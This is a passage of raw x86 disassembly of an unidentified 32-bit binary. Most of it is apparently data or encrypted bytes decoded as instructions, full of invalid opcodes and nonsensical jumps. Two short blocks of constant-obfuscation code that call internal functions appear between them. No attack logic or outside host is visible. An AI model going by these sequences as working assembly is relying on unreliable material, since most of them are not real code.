  419f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f0e:	or     al,0x20
  419f10:	jnp    0x419f67
  419f12:	shr    esp,1
  419f14:	push   0x46
  419f16:	sbb    BYTE PTR [edx],cl
  419f18:	jecxz  0x419ee6
  419f1a:	or     DWORD PTR [ebx-0x79],ecx
  419f1d:	in     al,dx
  419f1e:	xchg   cl,al
  419f20:	pop    eax
  419f21:	pop    edx
  419f22:	jo     0x419f46
  419f24:	cmp    al,0x14
  419f26:	and    BYTE PTR [ebp-0x68],ch
  419f29:	xor    eax,0xc3762e9d
  419f2e:	lahf   
  419f2f:	mov    ch,0x71
  419f31:	jp     0x419f73
  419f33:	lods   al,BYTE PTR ds:[esi]
  419f34:	push   ss
  419f35:	je     0x419f5a
  419f37:	pop    esi
  419f38:	clc    
  419f39:	xchg   ebx,eax
  419f3a:	push   ebx
  419f3b:	adc    ah,bl
  419f3d:	es inc edi
  419f3f:	dec    ax
  419f41:	pop    ds
  419f42:	int    0xbd
  419f44:	fcmovu st,st(4)
  419f46:	int3   
  419f47:	(bad)  
  419f49:	or     al,0xea
  419f4b:	jae    0x419fc7
  419f4d:	mov    al,ds:0x82af519
  419f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f53:	sahf   
  419f54:	dec    esp
  419f55:	pop    ds
  419f56:	mov    dh,BYTE PTR [edi+eax*2+0x15d88b5c]
  419f5d:	jno    0x419f6f
  419f5f:	lods   eax,DWORD PTR ds:[esi]
  419f60:	and    DWORD PTR [edx],ecx
  419f62:	xlat   BYTE PTR ds:[ebx]
  419f63:	mov    ds:0x9904090,eax
  419f68:	addr16 or eax,0x9ac6175e
  419f6e:	pop    es
  419f6f:	outs   dx,BYTE PTR ds:[esi]
  419f70:	mov    bh,dh
  419f72:	push   0xffffff94
  419f74:	sar    BYTE PTR ds:0x8c81e7ae,1
  419f7a:	popf   
  419f7b:	enter  0x3b7d,0xef
  419f7f:	mov    ebp,0x9b12d103
  419f84:	pop    esp
  419f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f86:	xchg   ecx,eax
  419f87:	adc    eax,DWORD PTR [ebx]
  419f89:	pop    edi
  419f8a:	push   edi
  419f8b:	xchg   ebx,eax
  419f8c:	test   BYTE PTR [ebp-0x5b],ah
  419f8f:	fs xchg ebx,eax
  419f91:	or     BYTE PTR [edi+0x2d],ch
  419f94:	lods   eax,DWORD PTR ds:[esi]
  419f95:	ja     0x419fcb
  419f97:	or     al,0xd1
  419f99:	stos   BYTE PTR es:[edi],al
  419f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f9b:	sub    ebx,DWORD PTR [ebp-0x283bd903]
  419fa1:	or     eax,0x420eac40
  419fa6:	jmp    0x7c74:0xf1f0cc5e
  419fad:	mov    edi,0xb1b7b285
  419fb2:	jo     0x419f61
  419fb4:	fadd   DWORD PTR [edx+0xf]
  419fb7:	cmp    bl,ah
  419fb9:	mov    bl,dl
  419fbb:	mov    al,ds:0x863de958
  419fc0:	pop    edx
  419fc1:	and    BYTE PTR [ebp+eax*8-0x56291d8e],ch
  419fc8:	pop    esi
  419fc9:	jge    0x419f88
  419fcb:	mov    bh,0x9c
  419fcd:	jbe    0x41a044
  419fcf:	xchg   BYTE PTR [edx],ah
  419fd1:	and    al,0xc1
  419fd3:	arpl   WORD PTR [esi-0xf],sp
  419fd6:	jl     0x41a02c
  419fd8:	or     DWORD PTR [edi+0x50],esp
  419fdb:	out    dx,eax
  419fdc:	sbb    eax,0x13bbf6
  419fe1:	cmc    
  419fe2:	jmp    0x66809d5f
  419fe7:	arpl   WORD PTR [edx-0x5a],ax
  419fea:	fs fsub st(5),st
  419fed:	sub    eax,eax
  419fef:	int    0x3e
  419ff1:	rcr    BYTE PTR [ebx+0x676ccc2e],0xe2
  419ff8:	sbb    bh,BYTE PTR [eax+0x6e0229e1]
  419ffe:	pop    ebx
  419fff:	and    ah,0xc
  41a002:	push   esi
  41a003:	inc    edx
  41a004:	adc    eax,0x2c80c4fe
  41a009:	xor    al,0x5c
  41a00b:	neg    BYTE PTR [esi+0x4f6f7e46]
  41a011:	pop    eax
  41a012:	daa    
  41a013:	or     eax,edx
  41a015:	inc    ebx
  41a016:	sub    DWORD PTR [eax+eax*4],edx
  41a019:	sub    eax,0x5e6b93ab
  41a01e:	imul   esi,eax,0x55
  41a021:	adc    edx,eax
  41a023:	pop    ds
  41a024:	retf   0xa440
  41a027:	add    eax,DWORD PTR [ecx+0x4383cfe6]
  41a02d:	cli    
  41a02e:	retf   
  41a02f:	jnp    0x41a010
  41a031:	mov    esi,0xbd68b276
  41a036:	std    
  41a037:	and    bh,BYTE PTR [ebp+eax*2+0x7b]
  41a03b:	pop    ebp
  41a03c:	std    
  41a03d:	push   esi
  41a03e:	imul   ecx,DWORD PTR [eax],0x7f
  41a041:	inc    eax
  41a042:	(bad)  
  41a043:	mov    ebp,0x2747efca
  41a048:	xchg   DWORD PTR [edx],eax
  41a04a:	lods   eax,DWORD PTR ds:[esi]
  41a04b:	iret   
  41a04c:	rcr    DWORD PTR [ecx+0x337f6b93],0x20
  41a053:	xchg   ebx,eax
  41a054:	dec    eax
  41a055:	mov    bl,0x58
  41a057:	sbb    DWORD PTR [esi],edi
  41a059:	adc    ax,WORD PTR [eax-0x10]
  41a05d:	ins    DWORD PTR es:[edi],dx
  41a05e:	fdiv   QWORD PTR [eax-0x10b854db]
  41a064:	imul   eax,ebx,0x37
  41a067:	imul   edi,esp,0xfffffff8
  41a06a:	out    dx,eax
  41a06b:	mov    al,ds:0x67e97e2
  41a070:	push   esi
  41a071:	dec    ecx
  41a072:	sub    BYTE PTR es:0x598e94fa,ah
  41a079:	mov    edx,0xce49b268
  41a07e:	cmc    
  41a07f:	mov    ebp,0x883a4c56
  41a084:	adc    al,dh
  41a086:	dec    eax
  41a087:	cmp    esi,DWORD PTR [ecx-0x39]
  41a08a:	pop    esp
  41a08b:	adc    ch,BYTE PTR [ebp-0x35]
  41a08e:	jb     0x41a09b
  41a090:	pusha  
  41a091:	out    dx,eax
  41a092:	dec    ah
  41a094:	xor    al,0x79
  41a096:	jno    0x41a0fc
  41a098:	mov    eax,0x7d58b17a
  41a09d:	adc    al,BYTE PTR [esp+esi*2-0x5801c19d]
  41a0a4:	(bad)  
  41a0a6:	sti    
  41a0a7:	pushf  
  41a0a8:	les    ebx,FWORD PTR [esp+edi*2+0x198ba142]
  41a0af:	xor    DWORD PTR [edi+0x7d91a9f4],ecx
  41a0b5:	gs out 0x28,eax
  41a0b8:	icebp  
  41a0b9:	daa    
  41a0ba:	and    ebx,edx
  41a0bc:	retf   
  41a0bd:	call   DWORD PTR [ecx-0x5d69e767]
  41a0c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0c4:	jbe    0x41a0c6
  41a0c6:	pop    ecx
  41a0c7:	pop    edi
  41a0c8:	scas   al,BYTE PTR es:[edi]
  41a0c9:	sub    edx,eax
  41a0cb:	dec    esi
  41a0cc:	dec    ebp
  41a0cd:	test   BYTE PTR [edx+ebx*8-0x67f1c5c6],dh
  41a0d4:	test   DWORD PTR [edi*2-0x7d6e9999],ebx
  41a0db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0dc:	jne    0x41a14b
  41a0de:	add    bh,BYTE PTR [ebx-0x61]
  41a0e1:	lea    eax,[eax+0x37680bef]
  41a0e7:	in     al,dx
  41a0e8:	dec    ecx
  41a0e9:	xchg   BYTE PTR [eax],bl
  41a0eb:	adc    edi,DWORD PTR [eax]
  41a0ed:	retf   0xa204
  41a0f0:	push   ecx
  41a0f1:	sub    dl,BYTE PTR ds:0x2b8e3deb
  41a0f7:	push   ss
  41a0f8:	jmp    0x5675c44a
  41a0fd:	pop    esp
  41a0fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0ff:	fwait
  41a100:	repnz xchg ecx,eax
  41a102:	add    DWORD PTR ds:0x63a5f79,esp
  41a108:	xchg   ebp,eax
  41a109:	xor    al,BYTE PTR [ebx+0x2183a9c9]
  41a10f:	arpl   bx,bx
  41a111:	gs retf 
  41a113:	scas   eax,DWORD PTR es:[edi]
  41a114:	pushf  
  41a115:	fidiv  WORD PTR [edi+0xddd8d07]
  41a11b:	shl    DWORD PTR [esi-0x68cf54cc],1
  41a121:	inc    esp
  41a122:	int    0xdc
  41a124:	and    BYTE PTR [ebp+ebx*2+0x57dd560d],0xf9
  41a12c:	adc    eax,0xea60612a
  41a131:	add    al,BYTE PTR [eax+0x45]
  41a134:	dec    ebx
  41a135:	in     eax,0xdd
  41a137:	pop    ebp
  41a138:	cmc    
  41a139:	shr    edi,1
  41a13b:	push   edx
  41a13c:	out    dx,al
  41a13d:	mov    al,0x14
  41a13f:	mov    ah,0xb4
  41a141:	mov    ah,0x72
  41a143:	xchg   esp,eax
  41a144:	sbb    DWORD PTR [ecx+eax*8],esi
  41a147:	call   0xfe97e3b1
  41a14c:	outs   dx,DWORD PTR ds:[esi]
  41a14d:	cli    
  41a14e:	es dec edi
  41a150:	neg    DWORD PTR [esi]
  41a152:	aad    0xbf
  41a154:	loop   0x41a12b
  41a156:	jno    0x41a18f
  41a158:	data16 fisttp DWORD PTR [edi-0x634bcdfd]
  41a15f:	xor    eax,0xb2d31a01
  41a164:	mov    edx,0xe3427f8f
  41a169:	iret   
  41a16a:	es push ss
  41a16c:	int3   
  41a16d:	push   ebp
  41a16e:	pusha  
  41a16f:	mov    gs,WORD PTR [esi+0x67]
  41a172:	add    eax,0x38957328
  41a177:	mov    esi,DWORD PTR [esi+0x7b]
  41a17a:	xor    al,0x9c
  41a17c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a17d:	sbb    BYTE PTR [eax-0x1e153914],al
  41a183:	jp     0x41a114
  41a185:	sub    al,0xe3
  41a187:	imul   ebp,DWORD PTR [esi],0x1d254377
  41a18d:	imul   esi,DWORD PTR [ecx],0xf7cb1759
  41a193:	jle    0x41a1fc
  41a195:	cs add ah,ah
  41a198:	dec    esp
  41a199:	mov    ds:0xa74d5fdb,al
  41a19e:	cwde   
  41a19f:	adc    edx,DWORD PTR [eax]
  41a1a1:	out    0xc9,eax
  41a1a3:	dec    edx
  41a1a4:	dec    esi
  41a1a5:	sti    
  41a1a6:	shr    BYTE PTR [esi*1+0x1c876ca1],cl
  41a1ad:	xor    eax,0x42076ad7
  41a1b2:	lods   al,BYTE PTR ds:[esi]
  41a1b3:	das    
  41a1b4:	mov    cl,0x4b
  41a1b6:	adc    esp,edx
  41a1b8:	pminsw mm7,mm5
  41a1bb:	js     0x41a217
  41a1bd:	and    esp,0x471dc4c9
  41a1c3:	push   ss
  41a1c4:	sub    eax,0x6f23808f
  41a1c9:	jbe    0x41a21b
  41a1cb:	retf   
  41a1cc:	test   eax,0xea219ff3
  41a1d1:	xchg   ecx,eax
  41a1d2:	pop    ecx
  41a1d3:	adc    BYTE PTR [ecx-0x2688b7d9],bl
  41a1d9:	out    dx,al
  41a1da:	(bad)  
  41a1db:	sub    al,0xa6
  41a1dd:	mov    cr4,ebp
  41a1e0:	jecxz  0x41a1d8
  41a1e2:	in     al,dx
  41a1e3:	rol    BYTE PTR [ebx+0x6a4986e3],1
  41a1e9:	lea    ebx,[esi+ebp*1+0x2d]
  41a1ed:	pop    esi
  41a1ee:	fwait
  41a1ef:	sbb    BYTE PTR [ebx+0x4b81e509],0xf3
  41a1f6:	inc    ebp
  41a1f7:	outs   dx,DWORD PTR ds:[esi]
  41a1f8:	sbb    ax,0x99df
  41a1fc:	mov    edi,0x95d77a41
  41a201:	pop    DWORD PTR [esi]
  41a203:	sahf   
  41a204:	adc    edx,DWORD PTR [edi]
  41a206:	jge    0x41a1ba
  41a208:	mov    ds:0x554bd8ed,eax
  41a20d:	mov    eax,ds:0x7809c950
  41a212:	imul   eax,edi,0xffffffb2
  41a215:	aaa    
  41a216:	pop    edi
  41a217:	xchg   ecx,eax
  41a218:	mov    DWORD PTR [eax+0x6e],ecx
  41a21b:	nop
  41a21c:	add    esp,DWORD PTR [edx+0x5d25fad7]
  41a222:	xor    al,BYTE PTR [eax]
  41a224:	add    BYTE PTR [ecx-0x7eafdbbc],cl
  41a22a:	loope  0x41a270
  41a22c:	xor    eax,0x4c890000
  41a231:	and    al,0x54
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	push   ecx
  41a2a1:	div    BYTE PTR [ebx+0x7c]
  41a2a4:	sub    ebp,DWORD PTR [ebp+0x12bc1816]
  41a2aa:	sbb    BYTE PTR [eax],bl
  41a2ac:	lahf   
  41a2ad:	bound  eax,QWORD PTR [ebp-0x75770622]
  41a2b3:	ret    0x1705
  41a2b6:	sbb    DWORD PTR [ebx],ebp
  41a2b8:	cmp    al,0xe3
  41a2ba:	ret    0x50e9
  41a2bd:	sub    edx,DWORD PTR fs:[ebx-0x76037c3e]
  41a2c4:	xor    eax,0x9c5e31b8
  41a2c9:	retf   0x8c14
  41a2cc:	or     BYTE PTR [edi+esi*4-0x3b88f0a8],ah
  41a2d3:	cmp    eax,DWORD PTR [esi]
  41a2d5:	ja     0x41a322
  41a2d7:	std    
  41a2d8:	clc    
  41a2d9:	dec    edi
  41a2da:	hlt    
  41a2db:	rol    DWORD PTR [esi+0x50],cl
  41a2de:	lods   eax,DWORD PTR ds:[esi]
  41a2df:	pop    es
  41a2e0:	adc    ebx,DWORD PTR [ecx-0x5638ca2b]
  41a2e6:	pushf  
  41a2e7:	jl     0x41a2f3
  41a2e9:	xchg   esp,eax
  41a2ea:	(bad)  
  41a2eb:	out    0x9e,eax
  41a2ed:	mov    ebp,ebx
  41a2ef:	ja     0x41a331
  41a2f1:	inc    ebx
  41a2f2:	and    dl,dh
  41a2f4:	xchg   BYTE PTR [edx],ch
  41a2f6:	stc    
  41a2f7:	test   BYTE PTR [edi+0x711ffc8c],dl
  41a2fd:	ret    0xaf79
  41a300:	lahf   
  41a301:	cmp    eax,0xc27a95c9
  41a306:	popa   
  41a307:	cdq    
  41a308:	sar    BYTE PTR [ecx-0x5c],0x8c
  41a30c:	pop    esi
  41a30d:	sti    
  41a30e:	ret    
  41a30f:	fstp   TBYTE PTR ds:0xf13b222e
  41a315:	and    DWORD PTR [edi+0x13a403e0],edi
  41a31b:	dec    eax
  41a31c:	or     eax,0xdd8cee0a
  41a321:	std    
  41a322:	and    DWORD PTR [eax],ebp
  41a324:	lds    ebx,FWORD PTR [esi-0x6bac3ed0]
  41a32a:	pusha  
  41a32b:	dec    esp
  41a32c:	dec    esi
  41a32d:	cmp    ebx,ebx
  41a32f:	and    eax,0xaa209fe5
  41a334:	xor    BYTE PTR [eax+0x74],bh
  41a337:	inc    esi
  41a338:	hlt    
  41a339:	inc    ebx
  41a33a:	retf   0x788e
  41a33d:	mov    bh,BYTE PTR [ecx+0x7c]
  41a340:	bound  esp,QWORD PTR [ecx-0x29]
  41a343:	fld    DWORD PTR [esi]
  41a345:	into   
  41a346:	or     ebx,DWORD PTR [ebp+0x41e65376]
  41a34c:	add    BYTE PTR [esi],ah
  41a34e:	sub    DWORD PTR es:[esi+0x63e7c14c],0xe9975820
  41a359:	pusha  
  41a35a:	xor    ebp,DWORD PTR [ebx-0x36bf0d3b]
  41a360:	xor    ebp,edx
  41a362:	hlt    
  41a363:	repnz cli 
  41a365:	ret    
  41a366:	iret   
  41a367:	inc    ebp
  41a368:	rcr    edx,0x5d
  41a36b:	into   
  41a36c:	jle    0x41a302
  41a36e:	jl     0x41a3b5
  41a370:	mov    DWORD PTR [esi+0x24],ebx
  41a373:	dec    ebx
  41a374:	lock adc ecx,edx
  41a377:	jle    0x41a307
  41a379:	xchg   esi,eax
  41a37a:	repnz sbb BYTE PTR [ecx+edi*1],bl
  41a37e:	pop    ds
  41a37f:	inc    eax
  41a380:	push   0xc9e50d75
  41a385:	and    dh,BYTE PTR [eax+edx*2-0x50]
  41a389:	popa   
  41a38a:	sub    al,ah
  41a38c:	std    
  41a38d:	repnz inc ebx
  41a38f:	fwait
  41a390:	push   cs
  41a391:	sbb    eax,0xfb664cfa
  41a396:	xchg   BYTE PTR [edi],dl
  41a398:	push   es
  41a399:	xchg   BYTE PTR [ebx+0x12],bl
  41a39c:	cmp    BYTE PTR ds:0xaa3f9c81,ch
  41a3a2:	push   eax
  41a3a3:	xor    DWORD PTR [edx],edx
  41a3a5:	call   DWORD PTR [edx-0x5bedfce6]
  41a3ab:	or     bl,0xe8
  41a3ae:	pop    esi
  41a3af:	jge    0x41a3bc
  41a3b1:	sti    
  41a3b2:	mov    eax,0x6d205255
  41a3b7:	adc    al,0xf3
  41a3b9:	add    DWORD PTR [ebx],0xdffff148
  41a3bf:	pop    esi
  41a3c0:	mov    ch,0x8a
  41a3c2:	xor    ebp,ecx
  41a3c4:	aas    
  41a3c5:	sbb    eax,0xd7ca507f
  41a3ca:	jne    0x41a356
  41a3cc:	(bad)  
  41a3cd:	push   edi
  41a3ce:	aas    
  41a3cf:	in     eax,0xc
  41a3d1:	fs lock jmp 0x224c:0xb872f9fb
  41a3da:	aam    0xc3
  41a3dc:	sbb    ebx,DWORD PTR [ebx+ebp*1+0x76c399d7]
  41a3e3:	and    dl,BYTE PTR [ecx]
  41a3e5:	imul   ebp,DWORD PTR [esi-0x3f],0x56
  41a3e9:	pushf  
  41a3ea:	dec    ebx
  41a3eb:	and    al,0x40
  41a3ed:	sbb    bh,BYTE PTR [edx]
  41a3ef:	cmp    esp,DWORD PTR [ebx-0x2]
  41a3f2:	xor    DWORD PTR [ecx+esi*2+0x4e],esi
  41a3f6:	xchg   BYTE PTR [edi],bh
  41a3f8:	and    eax,0x11a66dfd
  41a3fd:	ins    DWORD PTR es:[edi],dx
  41a3fe:	mov    ss,WORD PTR [edi]
  41a400:	aam    0x88
  41a402:	mov    dl,0x16
  41a404:	xor    ebx,DWORD PTR [edx+0x40]
  41a407:	xor    al,0x88
  41a409:	mov    bl,0x52
  41a40b:	inc    esp
  41a40c:	rcr    DWORD PTR [ecx+0xed8b180],1
  41a412:	mov    ecx,0x7ffb314c
  41a417:	jo     0x41a469
  41a419:	fbstp  TBYTE PTR [edx]
  41a41b:	mov    DWORD PTR [edx],edx
  41a41d:	jns    0x41a3d0
  41a41f:	cmp    eax,0x51167e46
  41a424:	lds    esp,FWORD PTR [ebp+0xe429c5e]
  41a42a:	test   DWORD PTR [ebx],0x18240e93
  41a430:	int    0xb3
  41a432:	mov    al,0xba
  41a434:	xor    ecx,DWORD PTR [ebp+0xd]
  41a437:	test   DWORD PTR [esi],0x1394c2ab
  41a43d:	mov    DWORD PTR [edi],0x5f23242
  41a443:	(bad)  
  41a444:	pop    DWORD PTR [edx+0xdba3f4a]
  41a44a:	cli    
  41a44b:	adc    eax,0x9db87326
  41a450:	mov    dl,dl
  41a452:	sub    bh,dh
  41a454:	or     al,0x56
  41a456:	adc    BYTE PTR [esi+ebp*4+0x26],0x45
  41a45b:	mov    fs,WORD PTR ds:0xf24609c7
  41a461:	(bad)  
  41a462:	cmp    al,0xcd
  41a464:	rep stos DWORD PTR es:[edi],eax
  41a466:	xor    esp,eax
  41a468:	dec    esp
  41a469:	add    dl,dh
  41a46b:	sub    al,0xad
  41a46d:	cld    
  41a46e:	xchg   edi,eax
  41a46f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a471:	stos   BYTE PTR es:[edi],al
  41a472:	sahf   
  41a473:	adc    DWORD PTR [ecx],edx
  41a475:	or     ebp,ebp
  41a477:	sbb    DWORD PTR [ebp-0x3089bec0],ebx
  41a47d:	push   ss
  41a47e:	(bad)  
  41a480:	test   eax,0x11815232
  41a485:	push   0x2c30694b
  41a48a:	xor    al,0x31
  41a48c:	pop    ebx
  41a48d:	xor    BYTE PTR [eax+edx*8+0x21782088],bh
  41a494:	push   ds
  41a495:	retf   
  41a496:	jmp    FWORD PTR [edx-0x493a0b26]
  41a49c:	test   eax,0xc23dd12a
  41a4a1:	sub    eax,0xaf9b409b
  41a4a6:	dec    esi
  41a4a7:	xchg   BYTE PTR [ebx-0x4f],ch
  41a4aa:	jo     0x41a4e2
  41a4ac:	adc    BYTE PTR [esi],dl
  41a4ae:	mov    ch,0x5c
  41a4b0:	pop    esi
  41a4b1:	xor    BYTE PTR [esi-0x2],al
  41a4b4:	mov    bh,0xfe
  41a4b6:	loope  0x41a49e
  41a4b8:	inc    ebx
  41a4b9:	(bad)  
  41a4ba:	iret   
  41a4bb:	cmp    dh,dl
  41a4bd:	rcr    DWORD PTR [edi-0x3d2b30a2],cl
  41a4c3:	f2xm1  
  41a4c5:	das    
  41a4c6:	leave  
  41a4c7:	and    bl,dl
  41a4c9:	inc    ecx
  41a4ca:	into   
  41a4cb:	sbb    al,0x66
  41a4cd:	inc    esp
  41a4ce:	and    eax,0x1b373ebc
  41a4d3:	call   FWORD PTR [ecx-0x17]
  41a4d6:	(bad)  
  41a4d8:	popf   
  41a4d9:	xchg   ecx,eax
  41a4da:	pop    edx
  41a4db:	mov    eax,0x27e10472
  41a4e0:	xchg   esp,eax
  41a4e1:	(bad)  
  41a4e2:	pop    edx
  41a4e3:	push   eax
  41a4e4:	cmp    bh,dh
  41a4e6:	pop    ebx
  41a4e7:	inc    ecx
  41a4e8:	(bad)  
  41a4e9:	in     eax,dx
  41a4ea:	inc    esp
  41a4eb:	popa   
  41a4ec:	pop    edx
  41a4ed:	xor    eax,0xa3122eb1
  41a4f2:	hlt    
  41a4f3:	sti    
  41a4f4:	mov    ds,WORD PTR [ebx]
  41a4f6:	sbb    al,0x49
  41a4f8:	icebp  
  41a4f9:	mov    eax,ds:0x2733385b
  41a4fe:	iret   
  41a4ff:	loopne 0x41a56e
  41a501:	fadd   DWORD PTR [ecx+eax*2+0x334b104b]
  41a508:	pop    es
  41a509:	mov    DWORD PTR [ecx+0x3c],ebx
  41a50c:	jge    0x41a4e6
  41a50e:	sub    bl,ah
  41a510:	ins    BYTE PTR es:[edi],dx
  41a511:	mov    eax,0x6e7ee1f7
  41a516:	jg     0x41a4c7
  41a518:	inc    esp
  41a519:	mov    WORD PTR ds:0xb7c3311d,ds
  41a51f:	sbb    edx,edx
  41a521:	fldenv [ecx+0x37]
  41a524:	stos   BYTE PTR es:[edi],al
  41a525:	arpl   WORD PTR [eax+0x144d6c81],si
  41a52b:	imul   ebp,DWORD PTR [esi+0x1],0xffffffee
  41a52f:	loop   0x41a4ca
  41a531:	lea    eax,[ebx-0x5b]
  41a534:	mov    edx,0x26588e8a
  41a539:	mov    esp,0xbb714811
  41a53e:	loop   0x41a4c2
  41a540:	test   BYTE PTR [eax],dh
  41a542:	fidivr WORD PTR [ecx+ebx*2+0xbf4d631]
  41a549:	xchg   DWORD PTR [ebp-0x60385cf6],ebx
  41a54f:	sub    BYTE PTR [eax],bl
  41a551:	add    eax,0xa1d904db
  41a556:	fistp  WORD PTR [ebx-0x56]
  41a559:	xchg   BYTE PTR [ecx+0x4f],ah
  41a55c:	hlt    
  41a55d:	pop    es
  41a55e:	mov    BYTE PTR [eax+0x35349de1],al
  41a564:	sbb    esp,DWORD PTR [ecx+0x26]
  41a567:	mov    WORD PTR [edx],ss
  41a569:	add    eax,0xd47c17
  41a56e:	fdiv   st(4),st
  41a570:	jge    0x41a530
  41a572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a573:	lds    esi,FWORD PTR [eax+0x73136db4]
  41a579:	ss jl  0x41a55d
  41a57c:	jp     0x41a534
  41a57e:	iret   
  41a57f:	out    0x1c,eax
  41a581:	mov    dh,BYTE PTR ds:0xdd55e0e6
  41a587:	xor    edx,DWORD PTR [ecx-0x3a9e4eae]
  41a58d:	sbb    DWORD PTR [ecx],esp
  41a58f:	imul   eax,DWORD PTR [eax+0x6aa4919b],0xe273b6b0
  41a599:	arpl   WORD PTR [ecx-0x31708f07],ax
  41a59f:	sub    dl,al
  41a5a1:	ins    BYTE PTR es:[edi],dx
  41a5a2:	sbb    BYTE PTR ds:[eax-0x44b812ff],dl
  41a5a9:	jo     0x41a551
  41a5ab:	lahf   
  41a5ac:	adc    ch,BYTE PTR [edx]
  41a5ae:	mov    dh,0xe3
  41a5b0:	js     0x41a550
  41a5b2:	outs   dx,BYTE PTR ds:[esi]
  41a5b3:	add    dl,BYTE PTR ds:0xa250e52c
  41a5b9:	ret    0x6f57
  41a5bc:	xchg   esi,eax
  41a5bd:	call   0x27e2:0x2944b73a
  41a5c4:	call   0x5eb6:0xe2c68094
  41a5cb:	dec    esi
  41a5cc:	fist   WORD PTR [eax+0x1295851c]
  41a5d2:	xchg   BYTE PTR [ecx],ah
  41a5d4:	rol    DWORD PTR [ebp-0x1c6e8ad4],1
  41a5da:	stos   BYTE PTR es:[edi],al
  41a5db:	loopne 0x41a615
  41a5dd:	xchg   ecx,eax
  41a5de:	sub    BYTE PTR [ebx+0x71ceb67a],bl
  41a5e4:	xchg   BYTE PTR [ecx+0x56],cl
  41a5e7:	jne    0x41a589
  41a5e9:	or     ecx,0x95546469
  41a5ef:	dec    ebp
  41a5f0:	cmp    al,0x15
  41a5f2:	adc    edx,eax
  41a5f4:	clc    
  41a5f5:	xchg   eax,edx
  41a5f7:	test   DWORD PTR [ebx-0x2c],edi
  41a5fa:	ja     0x41a5ad
  41a5fc:	add    ecx,eax
  41a5fe:	stos   BYTE PTR es:[edi],al
  41a5ff:	sbb    dh,BYTE PTR [edx-0x76fbab82]
  41a605:	pop    esi
  41a606:	jmp    0xb9c1:0xdcd6a5c
  41a60d:	bound  edx,QWORD PTR [edx-0x132b68f8]
  41a613:	fwait
  41a614:	aas    
  41a615:	stc    
  41a616:	rcr    DWORD PTR [ecx+0x3e],0xe8
  41a61a:	not    ebp
  41a61c:	sbb    eax,0x9a7c911b
  41a621:	shl    BYTE PTR [ecx],1
  41a623:	or     ebx,ebp
  41a625:	into   
  41a626:	xor    al,0xce
  41a628:	add    ch,0x8f
  41a62b:	pushf  
  41a62c:	daa    
  41a62d:	pop    es
  41a62e:	call   0x299dbbc1
  41a633:	xchg   edi,eax
  41a634:	dec    esp
  41a635:	mov    dl,BYTE PTR ds:[ebx]
  41a638:	adc    al,0xf2
  41a63a:	mov    ebp,0x208ecbcf
  41a63f:	stos   BYTE PTR es:[edi],al
  41a640:	sbb    BYTE PTR gs:[ebx-0x43320222],dl
  41a647:	js     0x41a632
  41a649:	cmp    bh,BYTE PTR [ebx]
  41a64b:	int    0x7c
  41a64d:	data16 sahf 
  41a64f:	(bad)  
  41a651:	(bad)  
  41a652:	jbe    0x41a69c
  41a654:	cmp    cl,ch
  41a656:	mov    dl,0x47
  41a658:	push   ss
  41a659:	retf   0xa9fa
  41a65c:	mov    al,0xd2
  41a65e:	sub    eax,ecx
  41a660:	mov    ecx,DWORD PTR [esp+0x50]
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x4220b4
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
